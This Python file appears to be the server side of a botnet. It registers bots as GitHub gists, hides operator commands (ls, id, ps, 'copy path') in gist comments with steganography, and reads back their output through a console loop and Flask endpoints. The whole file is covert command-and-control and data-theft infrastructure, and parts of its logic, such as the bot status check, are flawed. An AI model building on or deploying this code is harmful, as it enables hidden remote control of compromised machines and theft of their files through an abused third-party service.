import time
import requests
import threading
from flask import Flask, request

from helpers import gist_create, gist_delete, steg_encode, steg_decode,\
    gist_add_comment, gist_get_last_comments, CMD_COVERED, COMMANDS

app = Flask(__name__)

BOTS = []
SLEEP_PERIOD = 10
SLEEP_PERIOD_COMMENT = 5


@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"


@app.route("/bot-register", methods=['GET'])
def bot_register():
    gistId = gist_create()
    BOTS.append(gistId)

    print("Created gist with id:" + gistId)
    return { "gistId": gistId }, 200


@app.route("/bot-unregister", methods=['DELETE'])
def bot_unregister():
    gistId = request.args.get("gistId")
    gist_delete(gistId)

    BOTS.remove(gistId)

    print("Destroyed gist with id:" + gistId)
    return { "res": "Gist deleted... with Id: " + gistId }, 200


# periodically check each bot.. if is dead.. remove
def bots_status_check():
    print("TASK: Checking bots and their status...")
    while True:
        for i in BOTS:
            res = requests.get("http://127.0.0.1:1111/status")
            if res.status_code != 200:
                print("Gist with id: " + i + " not active..")
                BOTS.remove(i)
            time.sleep(SLEEP_PERIOD)

def print_output(gistId, cmd):
    for i in range(8):
        encoded_msg = gist_get_last_comments(gistId)
        decoded_msg = steg_decode(encoded_msg)

        if decoded_msg == cmd:
            time.sleep(SLEEP_PERIOD_COMMENT)
        else:
            return decoded_msg

def exec_command(cmd):
    gistId = cmd[0]
    command = cmd[1]
    if (len(cmd) > 2):
        command = cmd[1] + cmd[2]

    encoded_msg = steg_encode(CMD_COVERED[cmd[1]], command)
    gist_add_comment(gistId, encoded_msg)

    out_msg = print_output(gistId, command)
    return "ReqId: " + "," + out_msg

def read_input():
    while True:

        cmd_line = input("Enter a command in following format: \n gistId command args \n-------------\nSupported commands: [w, ls <path>, id, copy path, ./usr/bin/ps, exit]\n------------\n ")
        if cmd_line != None and cmd_line != "":
            cmd = cmd_line.split(" ")
            if len(cmd) < 2 or cmd[1] not in COMMANDS:
                print("Wrong format or unkown command")
            else:
                print("GistId: " + cmd[0] + ", command: " + cmd[1])
                exec_command(cmd)

def run_web():
    app.run(host="127.0.0.1", port=5001)

# if __name__ == '__main__':
threading.Thread(target=run_web).start()
threading.Thread(target=read_input).start()
threading.Thread(target=bots_status_check).start()
